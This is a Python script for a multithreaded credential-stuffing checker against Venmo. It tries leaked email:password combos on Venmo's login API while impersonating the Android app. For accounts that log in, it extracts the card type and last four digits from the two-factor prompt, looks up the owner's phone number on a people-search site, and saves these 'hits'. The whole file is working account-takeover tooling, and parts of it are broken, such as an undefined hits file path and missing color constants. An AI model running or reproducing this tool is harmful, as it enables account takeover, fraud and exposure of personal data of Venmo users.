import os
import threading
import requests
import uuid
import logging
from tkinter import Tk, filedialog
import json
import keyboard

# Global variables
threads = 1
valid_count = 0
invalid_count = 0
stopped = False
remaining_count = 0

# Lists to keep track of valid, invalid, and remaining lines
valid_lines = []
invalid_lines = []
remaining_lines = []

# Set up logging
logging.basicConfig(filename='checker.log', level=logging.INFO, format='%(asctime)s - %(levelname)s: %(message)s')

class Colors:
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    RED = '\033[91m'
    RESET = '\033[0m'

def generate_guid():
    return str(uuid.uuid4())

def perform_request(url, method, payload=None, headers=None):
    try:
        guid = generate_guid()
        if headers is None:
            headers = {}

        headers.update({
            "accept-encoding": "gzip",
            "accept-language": "de-DE",
            "application-id": "com.venmo",
            "device-id": guid,
            "user-agent": "Venmo/9.20.0 Android/7.1.2 samsung/SM-N976N",
            "x-venmo-android-version-code": "3186",
            "x-venmo-android-version-name": "9.20.0"
        })

        if method == "POST":
            response = requests.post(url, data=payload, headers=headers)
        elif method == "GET":
            response = requests.get(url, headers=headers)

        return response

    except Exception as e:
        logging.error(f"Error performing request: {e}")
        raise e

def check_combo(email, password):
    global valid_count, invalid_count, valid_lines, invalid_lines, remaining_lines

    url = "https://api.venmo.com/v1/oauth/access_token"
    payload = {
        "phone_email_or_username": email,
        "password": password,
        "client_id": "4"
    }

    try:
        response = perform_request(url, "POST", payload)

        if "Your email or password was incorrect." in response.text:
            invalid_count += 1
            invalid_lines.append(f"{email}:{password}\n")
            print(f"{Colors.RED}Invalid: {email}:{password}{Colors.RESET}")
        else:
            valid_count += 1
            valid_lines.append(f"{email}:{password}\n")
            headers = response.headers
            otp = headers.get("venmo-otp-secret")

            url = "https://api.venmo.com/v1/account/two-factor/token"
            headers = {"VENMO-OTP-SECRET": otp}
            response = perform_request(url, "GET", headers=headers)

            if "question_type\": \"card\"" in response.text:
                cc_type = response.json()["data"]["questions"][0]["value"]
                last_4 = response.text.split("(***) *** - ")[1].split("\"")[0]

                url = f"https://infotracer.com/email-lookup/getloaderdata/?email={email}"
                headers = {
                    "Host": "infotracer.com",
                    "Connection": "keep-alive",
                    "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest",
                    "sec-ch-ua-mobile": "?0",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": f"https://infotracer.com/loading/?ltid=home&mercSubId=home-email&type=email-lookup&searchTab=email",
                    "Accept-Language": "en-US,en;q=0.9,fa;q=0.8,fr;q=0.7,ru;q=0.6",
                    "Accept-Encoding": "gzip, deflate"
                }

                response = perform_request(url, "GET", headers=headers)

                if "\"numbers\"" in response.text:
                    number = response.json()["numbers"][email]
                    replace = number[:6]
                    phone_number = replace + last_4

                    print(f"{Colors.GREEN}Valid: {email}:{password}{Colors.RESET}")
                    print(f"{Colors.GREEN}Captured: CC Type: {cc_type}, Last 4: {last_4}, Phone Number: {phone_number}{Colors.RESET}")
                    capture = {
                        "email_password": f"{email}:{password}",
                        "cc_type": cc_type,
                        "last_4": last_4,
                        "phone_number": phone_number
                    }

                    with open(hits_file_path, "r") as hits_file:
                        hits = json.load(hits_file)
                        hits.append(capture)

                    with open(hits_file_path, "w") as hits_file:
                        json.dump(hits, hits_file)

    except Exception as e:
        logging.error(f"Error checking combo: {e}")
        print(f"{Colors.RED}Error checking combo: {e}{Colors.RESET}")

def rainbow_text(text):
    colors = [Colors.RED, Colors.YELLOW, Colors.GREEN, Colors.CYAN, Colors.BLUE, Colors.MAGENTA, Colors.WHITE]
    rainbow = []

    section_length = len(text) // len(colors)
    for i, color in enumerate(colors):
        start = i * section_length
        end = start + section_length
        rainbow.append(color + text[start:end])

    return ''.join(rainbow)

def print_header():
    header = """
    :::     ::: :::::::::: ::::    ::: ::::    ::::   ::::::::               :::    ::: 
    :+:     :+: :+:        :+:+:   :+: +:+:+: :+:+:+ :+:    :+:              :+:    :+: 
    +:+     +:+ +:+        :+:+:+  +:+ +:+ +:+:+ +:+ +:+    +:+               +:+  +:+  
    +#+     +#+ +#++:++#   +#+ +:+ +#+ +#+  +:+  +#+ +#+    +:+ +#++:++#++:++  +#++:+   
     +#+   +#+  +#+        +#+  +#+#+# +#+       +#+ +#+    +#+               +#+  +#+  
      #+#+#+#   #+#        #+#   #+#+# #+#       #+# #+#    #+#              #+#    #+# 
        ###     ########## ###    #### ###       ###  ########               ###    ###
    """

    print(Colors.CYAN + header + Colors.RESET)

def check_chunk(combos):
    global valid_count, invalid_count, remaining_count
    global valid_lines, invalid_lines, remaining_lines

    for combo in combos:
        if stopped:
            break

        email, password = combo.strip().split(':')
        check_combo(email, password)
        remaining_count -= 1

def save_results():
    global valid_count, invalid_count, remaining_count
    global valid_lines, invalid_lines, remaining_lines

    print("Saving hits/valids...")

    with open('valid.txt', 'w') as valid_file:
        for line in valid_lines:
            valid_file.write(line)

    with open('invalid.txt', 'w') as invalid_file:
        for line in invalid_lines:
            invalid_file.write(line)

    with open('remaining_lines.txt', 'w') as remaining_file:
        for line in remaining_lines:
            remaining_file.write(line)

    print("Results saved.")

def start_checking():
    global threads, stopped, valid_count, invalid_count, remaining_count
    global valid_lines, invalid_lines, remaining_lines

    threads = int(input(f"{Colors.CYAN}Enter the number of threads: {Colors.RESET}"))

    root = Tk()
    root.withdraw()
    combo_file = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])

    with open(combo_file, 'r') as file:
        combos = file.readlines()

    remaining_count = len(combos)

    print(f"{len(combos)} Venmo Accounts Loaded")

    chunk_size = len(combos) // threads
    combo_chunks = [combos[i:i+chunk_size] for i in range(0, len(combos), chunk_size)]

    thread_list = []

    try:
        for i in range(threads):
            thread = threading.Thread(target=check_chunk, args=(combo_chunks[i],))
            thread.start()
            thread_list.append(thread)

        while any(t.is_alive() for t in thread_list):
            print(f"Checked: {valid_count + invalid_count} Valid: {valid_count} Invalid: {invalid_count} Remaining: {remaining_count}", end='\r')

            if keyboard.is_pressed('x'):
                stopped = True
                print(f"\nPausing...")
                save_results()  # Save results when 'x' is pressed

                for thread in thread_list:
                    thread.join()

                print(f"\nPaused. Checked: {valid_count + invalid_count} Valid: {valid_count} Invalid: {invalid_count} Remaining: {remaining_count}")
                input("Press Enter to continue...")
                stopped = False
                thread_list = []

    except KeyboardInterrupt:
        stopped = True
        print(f"\nStopping...")
        save_results()  # Save results when KeyboardInterrupt is raised

        for thread in thread_list:
            thread.join()

        print(f"\nStopped. Checked: {valid_count + invalid_count} Valid: {valid_count} Invalid: {invalid_count} Remaining: {remaining_count}")

def main_menu():
    global valid_count, invalid_count, remaining_count

    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print_header()

        print(f"{Colors.GREEN}1. Start Checking")
        print(f"2. Exit{Colors.RESET}")

        choice = input(f"{Colors.CYAN}Select an option: {Colors.RESET}")

        if choice == "1":
            start_checking()
            print(f"\nChecked: {valid_count + invalid_count} Valid: {valid_count} Invalid: {invalid_count} Remaining: {remaining_count}")
            valid_count = invalid_count = remaining_count = 0
            input("\nPress Enter to continue...")

        elif choice == "2":
            exit()

if __name__ == "__main__":
    main_menu()

